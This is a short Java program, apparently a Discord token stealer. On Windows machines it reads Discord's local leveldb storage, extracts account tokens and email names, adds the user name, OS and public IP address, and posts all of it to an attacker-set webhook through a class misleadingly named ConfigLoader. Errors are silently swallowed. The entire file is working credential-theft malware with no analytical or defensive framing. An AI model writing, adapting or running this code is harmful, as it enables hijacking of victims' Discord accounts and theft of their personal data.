import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class Main {

	private static String webhookLink = "webhooklink";
	private static String image = "webhookimage";
	public static List<String> tokens = new ArrayList<String>();
	public static List<String> mails = new ArrayList<String>();
	private static boolean sended = false;

	public static void main(String[] args) throws IOException {
		if (System.getProperty("os.name").contains("Windows")) {
			String discordPath = System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/";
			for (String pathname : new File(discordPath).list()) {
				try {
					BufferedReader br = new BufferedReader(
							new InputStreamReader(new DataInputStream(new FileInputStream(discordPath + pathname))));
					String strLine;
					int index;
					while ((strLine = br.readLine()) != null && pathname.endsWith("ldb")) {
						while ((index = strLine.indexOf("oken")) != -1) {
							strLine = strLine.substring(index + "oken".length());
							tokens.add(strLine.split("\"")[1]);
						}
						while ((index = strLine.indexOf("mail_cache")) != -1) {
							strLine = strLine.substring(index + "mail_cache".length());
							mails.add(strLine.split("\"")[1]);
						}
						StringBuilder msg = new StringBuilder().append("```\\n");
						for (String s2 : mails) {
							msg.append("Discord Mail-Name: " + s2.split("@")[0] + "\\n");
						}
						for (String s : tokens) {
							if (isToken(s) && !sended) {
								msg.append("PC: " + System.getProperty("user.name") + "\\n")
										.append("OS: " + System.getProperty("os.name") + "\\n")
										.append("Discord Token: " + s + "\\n").append("IP: " + ipAdress())
										.append("\\n```");
						        try {
						        	ConfigLoader webhook = new ConfigLoader(webhookLink);
						            webhook.setContent(String.valueOf(msg));
						            webhook.setAvatarUrl(image);
						            webhook.setUsername("string_cancellation");
						            webhook.setTts(false);
									webhook.execute();
								} catch (IOException e) {
									// ignored
								}
								sended = true;
							}
						}
					}
					br.close();
				} catch (Exception ex) {
					// ignored
				}
			}
		}
	}

	public static boolean isToken(String str) {
		return str.length() > 40 && str.length() > 40
				&& (str.startsWith("mfa") && str.contains("_") || !str.startsWith("mfa"));
	}

	public static String ipAdress() {
		URL url;
		try {
			url = new URL("http://bot.whatismyipaddress.com");
			BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
			return reader.readLine().trim();
		} catch (Exception e) {
			// ignored
		}
		return "null";
	}

}